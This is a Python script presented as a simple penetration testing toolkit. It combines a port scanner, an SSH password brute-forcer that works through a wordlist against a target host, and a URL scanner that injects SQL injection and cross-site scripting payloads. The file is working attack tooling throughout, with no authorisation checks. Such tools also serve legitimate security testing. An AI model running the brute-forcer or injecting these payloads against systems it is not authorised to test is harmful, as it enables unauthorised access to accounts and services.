import argparse
import socket
import paramiko
import requests

def port_scanner(target):
    """Scan common ports on the target."""
    ports = [21, 22, 25, 80, 443, 3306]
    print(f"\n[+] Scanning ports on {target}...\n")

    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((target, port)) == 0:
                print(f"[+] Port {port} is OPEN")
            s.close()
        except Exception as e:
            print(f"[-] Error scanning port {port}: {e}")

def ssh_brute_force(target, username, wordlist):
    """Brute force SSH login."""
    try:
        with open(wordlist, "r") as file:
            passwords = file.read().splitlines()
        
        for password in passwords:
            print(f"[*] Trying password: {password}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target, username=username, password=password)
                print(f"[+] SSH Login Success: {username}@{target} | Password: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"[-] Error: {e}")
                return
    except FileNotFoundError:
        print("[-] Wordlist file not found.")

def vuln_scanner(url):
    """Basic vulnerability scanner for SQL Injection & XSS."""
    test_payloads = {
        "SQLi": ["'", "\"", "' OR '1'='1"],
        "XSS": ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>']
    }

    print(f"\n[+] Scanning {url} for vulnerabilities...\n")

    for vuln_type, payloads in test_payloads.items():
        for payload in payloads:
            test_url = f"{url}{payload}"
            response = requests.get(test_url)
            if payload in response.text:
                print(f"[!] {vuln_type} Vulnerability Found at: {test_url}")

def main():
    parser = argparse.ArgumentParser(description="Simple Penetration Testing Toolkit")
    parser.add_argument("-p", "--portscan", help="Port Scanner (Usage: -p <target>)", type=str)
    parser.add_argument("-b", "--bruteforce", nargs=3, metavar=('target', 'username', 'wordlist'),
                        help="SSH Brute Force (Usage: -b <target> <username> <wordlist>)")
    parser.add_argument("-v", "--vulnscan", help="Vulnerability Scanner (Usage: -v <URL>)", type=str)

    args = parser.parse_args()

    if args.portscan:
        port_scanner(args.portscan)
    elif args.bruteforce:
        target, username, wordlist = args.bruteforce
        ssh_brute_force(target, username, wordlist)
    elif args.vulnscan:
        vuln_scanner(args.vulnscan)
    else:
        print("[-] No valid option provided. Use -h for help.")

if __name__ == "__main__":
    main()
